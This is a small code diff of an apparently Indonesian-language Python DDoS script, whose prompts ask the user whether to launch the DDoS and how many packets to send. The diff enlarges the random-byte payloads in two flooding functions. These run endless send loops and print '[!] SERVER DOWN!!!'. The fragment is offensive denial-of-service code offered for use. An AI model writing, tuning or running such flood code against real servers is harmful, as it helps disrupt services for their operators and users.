@@ -31,7 +31,7 @@ choice = str(input(" GASKEN NGEDDOS?(y/n):"))
 times = int(input(" PACKETS:"))
 threads = int(input(" ISI PACKETS:"))
 def run():
-	data = random._urandom(20179)
+	data = random._urandom(20000)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -45,7 +45,7 @@ def run():
 			print("[!] SERVER DOWN!!!")
 
 def run2():
-	data = random._urandom(16)
+	data = random._urandom(160)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
